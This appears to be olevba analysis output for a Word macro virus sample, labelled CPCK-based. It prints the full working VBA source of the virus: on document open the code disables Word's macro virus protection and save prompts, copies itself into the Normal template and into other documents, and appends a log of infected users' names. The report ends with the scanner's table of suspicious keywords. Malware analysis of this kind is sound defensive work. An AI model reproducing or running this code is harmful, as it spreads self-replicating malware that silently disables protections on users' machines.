olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-ed8373e424b20f81b7bf5901dc9d84ed82be4770
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-ed8373e424b20f81b7bf5901dc9d84ed82be4770 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
On Error Resume Next
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
Options.SaveNormalPrompt = 0
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
Options.ConfirmConversions = 0
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
Application.EnableCancelKey = 0
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
Options.VirusProtection = 0
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
FP72 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
AL60 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
If FP72 > 0 And AL60 > 0 Then GoTo RA52
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
If FP72 = 0 Then
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
Set TC3 = ActiveDocument.VBProject.VBComponents.Item(1)
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
UP39 = True
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
End If
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
If AL60 = 0 Then
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
Set TC3 = NormalTemplate.VBProject.VBComponents.Item(1)
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
FP72 = FP72 + 2
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
LQ83 = True
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
End If
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
If LQ83 <> True And UP39 <> True Then GoTo RA52
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
If LQ83 = True Then TC3.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FP72 - 1))
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
If UP39 = True Then TC3.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AL60 - 1))
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
With TC3.CodeModule
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
For x = 2 To (TC3.CodeModule.CountOfLines - 1) Step 2
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
Next x
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
End With
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
If Month(Now) = Month(Now) And Day(Now) = Day(Now) Then MsgBox "" & Application.UserName & "BlackViruZ : tengo MacroViruZ que crear, antiviruz que evadir y documentos que matar"
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
RA52:
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
If AL60 <> 0 And FP72 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** PAPI  RIQUI was infected 08/12/1998 10:43:31 AM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Alfredo was infected 20/01/1999 00:39:09
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** HMHGHHH was infected 21/01/1999 05:07:41 PM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Computronic was infected 27/01/99 18:05:08
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** martin was infected 5/02/99 14:16:42
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Microsoft 95 version B. was infected 08/02/1999 10:42:36 AM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Microsoft 95 version B. was infected 09/02/1999 07:17:59 PM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Microsoft 95 version B. was infected 10/02/1999 08:27:36 PM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Prof. Wilmer was infected 20/02/99 07:11:03 a.m.
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Prof. Carlos Bustamante was infected 20/02/99 04:34:08 p.m.
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Wilmer was infected 23.02.99 11:19:19
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Wilmer was infected 25/02/99 10:09:37 p.m.
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** ANA was infected 25/2/99 04:05:19 p.m.
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Extensión Profesional was infected 2/25/99 7:46:23 PM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Marcelo was infected 02/03/99 08:04:12 a.m.
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** WIN95 was infected 04/03/99 12:08:21 p.m.
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** SERVICIO TECNICO was infected 10/03/99 12:13:59 PM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Compaq was infected 24/03/99 09:31:12 a.m.
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** XEROX AREQUIPA was infected 01/04/1999 08:19:50 AM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Alejandro Rozas was infected 6/4/99 9.12.26
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Claudia Bravo was infected 4/20/99 10:59:31 AM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Avert was infected 12/22/98 7:01:09 PM
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
' ****** Skag was infected 13.6.1999 13:15:01
'SkagSVICTIM.DOCVICTIM.DOCCanon Bubble-Jet BJC-4000 on LPT1:13.6.1999 13:15:16
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

